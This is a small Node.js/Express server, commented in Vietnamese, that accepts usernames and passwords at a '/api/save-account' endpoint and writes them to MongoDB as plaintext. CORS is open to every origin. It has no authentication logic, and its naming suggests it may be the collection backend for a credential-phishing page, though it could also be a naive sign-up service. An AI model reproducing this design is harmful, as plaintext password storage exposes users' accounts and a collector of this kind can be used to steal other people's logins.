const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000; // Để chạy được trên Render

// 1. Cấu hình Middleware
app.use(express.json());
app.use(cors());

// 2. Kết nối MongoDB (THAY LINK CỦA OG VÀO ĐÂY)
const mongoURI = process.env.MONGO_URI;

mongoose.connect(mongoURI)
    .then(() => console.log("✅ Đã kết nối MongoDB thành công!"))
    .catch(err => console.error("❌ Lỗi kết nối MongoDB:", err));

// 3. Tạo khuôn mẫu dữ liệu (Schema)
const UserSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true },
    timestamp: { type: Date, default: Date.now }
});
const User = mongoose.model('User', UserSchema);

// 4. API lưu tài khoản
app.post('/api/save-account', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send("bad");
    }

    try {
        const newUser = new User({ username, password });
        await newUser.save(); // Lưu trực tiếp lên đám mây
        console.log("💾 Đã lưu vào MongoDB:", username);
        res.status(200).send("userok");
    } catch (err) {
        console.error("❌ Lỗi khi lưu:", err);
        res.status(500).send("badsever");
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server online tại port: ${PORT}`);
});